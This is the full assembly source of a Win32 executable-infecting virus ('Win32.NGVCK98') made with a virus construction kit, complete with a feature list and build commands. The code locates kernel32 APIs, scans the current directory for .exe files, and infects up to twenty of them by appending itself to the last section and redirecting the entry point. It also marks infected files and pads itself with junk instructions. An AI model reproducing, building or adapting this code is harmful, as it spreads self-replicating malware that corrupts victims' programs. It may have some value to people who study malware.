              
;
;
; Win32.NGVCK98 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK98
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 47
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop eax
 sub eax, offset Delta
                                        ; mov ebp, eax
                                        ; clear ebp
 mov ebp, 61162d
 sub ebp, 61162d
 add ebp, eax
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ecx

                                        ; clear edi
 mov edi, 0
 add edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], edi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov edx, offset filemask
 add edx, ebp

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+InfCounter]
 add edx, -1
 add edx, 1
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile
 and dword ptr [ebp+Trash1], ebx        ; Trash

EndInfectCurDir:
                                        ; Close the Handle
 mov esi, dword ptr [ebp+FindHandle]
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 inc esp
 sub esp, 5d
                                        ; round to pages
 shr eax, 16d
 ror eax, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 74467
 sub dword ptr [ebp+K32Trys], 4467d

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je CheckPE

GK2:
 dec eax
 sub eax, 65535d
 mov ecx, dword ptr [ebp+K32Trys]
 dec ecx
 mov dword ptr [ebp+K32Trys], -1
 and dword ptr [ebp+K32Trys], ecx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ebx, [eax+3Ch]
 neg eax
 sub ebx, eax
 neg eax
                                        ; check for EP
 movzx edx, word ptr [ebx]
 cmp edx, 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ebx, 22
 inc ebx
 add ebx, 21d
                                        ; clear edx
 mov edx, -21138d
 add edx, 21138d
 movzx edx, word ptr [ebx]
 and dx, 0F000h
 cmp dx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 dec ebx
 sub ebx, 21d


KernelFound:
 mov dword ptr [ebp+KernelMZ], eax
 mov dword ptr [ebp+KernelPE], ebx

 jmp GetApis

;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx
                                        ; clear eax
 mov eax, -52916d
 add eax, 52916d
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 inc ebx
 add ebx, 27d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; add ebx, 4
 add ebx, 4d
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; load API Names and Offsets
 lea esi, [ebp+APINames]
 xchg esi, edx

 mov edi, ebp
 add edi, offset APIOffsets


GetApisLoop: 

                                        ; clear eax
 push 0
 pop eax
 mov al, byte ptr [edx]
                                        ; add edx, 1
 sub edx, -1d

                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; edx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 push edx
 add dword ptr [esp], eax
 pop edx
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], ebx
                                        ; add edi, 4
 add edi, 4d
 dec ecx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]
 xchg ecx, eax

 push ecx
                                        ; clear eax
 mov eax, -40530d
 add eax, 40530d
 add eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg ecx, esi

 push ecx
 adc ebx, 65555402d                     ; Trash
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, ( 276d xor 4d )
 xor ecx, 4d
 lea ebx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec ecx
 jnz ClearOldData2
 popad
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, esi
 add ecx, [esi+3Ch]
                                        ; get File Alignment
 mov ebx, [ecx+3Ch]
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], ebx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 rcl eax, 5d                            ; Trash
 xor dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push ecx
 pop esi
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
 add ecx, ebx
                                        ; add ecx, 120
 inc ecx
 add ecx, 119d
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [esi+74h]
 shl ebx, 3
 add ecx, ebx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ebx
                                        ; clear eax
 and eax, 0

 add eax, [ecx+10h]
                                        ; mov edx, eax
 push eax
 pop edx
 add eax, [ecx+14h]
 push eax
 mov ebx, edx
 add ebx, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
                                        ; clear ebx
 and ebx, 0

 add ebx, [ecx+10h]
 push ebx
                                        ; calculate new section size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [ecx+08h], ebx
 mov ebx, dword ptr [ecx+10h]
 add ebx, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add dword ptr [ebp+Trash1], 1541162    ; Trash
 mov edx, VirusSize
 lea ebx, [ebp+Virus]
 xchg esi, ebx

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov edx, -1
 mov edx, ( -1d xor 18d )
 xor edx, 18d
 and edx, dword ptr [ebp+InfCounter]
 dec edx
 push edx
 pop dword ptr [ebp+InfCounter]
 clc
ret

NoEXE:
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edx, [ebp+WFD_szFileName]
 xchg edx, edi

 push edi
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz CloseFile
                                        ; clear ebx
 push 0
 pop ebx
 push ecx
 push ebx
 push ebx
                                        ; mov eax, 2
 mov eax, 2d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 and word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ebx
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
                                        ; mov ebx, ecx
 mov ebx, ecx
                                        ; mov edi, ecx
                                        ; clear edi
 mov edi, -40314d
 add edi, 40314d
 add edi, ecx
 mov dword ptr [ebp+TempApisearch1], eax
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], edi
 mov dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [edi]
 cmp ch, byte ptr [edx]
 jne ApiNotFound
 add eax, -1
 or eax, eax
 jz FoundApi1
                                        ; add edx, 1
 inc edx
                                        ; add edi, 1
 sub edi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 mov edi, dword ptr [ebp+TempApisearch2]
 push dword ptr [ebp+NTableTemp]
 pop ebx
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+TempApisearch1]
 mov edx, dword ptr [ebp+TempApisearch3]
                                        ; add ebx, 4
 add ebx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov ebx, ecx
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [ebx]
 sal ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [ecx]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 KernelMZ    dd 0h
 Trash1      dd 0h
 MapAddress  dd 0h
 NewSize     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 K32Trys     dd 0h
 NewEIP      dd 0h
 TempApisearch1 dd 0h
 filemask    db '*.EXe',0
 FileHandle  dd 0h
 counter     dw 0h
 NTableTemp  dd 0h
 NTableVA    dd 0h
 MapHandle   dd 0h
 TempApisearch2 dd 0h
 TempApisearch3 dd 0h
 db 'Win32.NGVCK98 of SnakeByte',0
 OTableVA    dd 0h
 FindHandle  dd 0h
 InfCounter  dd 0h
 OldEIP      dd 0h
 TempAPI     dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h


 APINames:
 db 15d, 'UnmapViewOfFile'
 db 11d, 'CreateFileA'
 db 18d, 'CreateFileMappingA'
 db 11d, 'CloseHandle'
 db 13d, 'FindNextFileA'
 db 14d, 'FindFirstFileA'
 db 09d, 'FindClose'
 db 13d, 'MapViewOfFile'

 AlignReg1   dd 0h
 OldBase     dd 400000h
 AlignReg2   dd 0h
 KernelPE    dd 0h
 ATableVA    dd 0h




;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea esi, [ebp+WFD_nFileSizeLow]
 xchg esi, ebx

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
 ror eax, 25d                           ; Trash
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ecx, word ptr [eax]
 sub ecx, 'ZM'
 jz Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear ecx
 mov ecx, 0
 mov cx, word ptr [eax+3Ch]
 cmp ecx, 0
 je Notagoodfile
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [eax+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ebx, 5606
 push 5606d
 pop ebx
 cmp ebx, 5606d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [edx+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [edx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx

 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 jmp ebx



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 xor edx, edx
 push edx
 call ExitProcess



end FakeCode

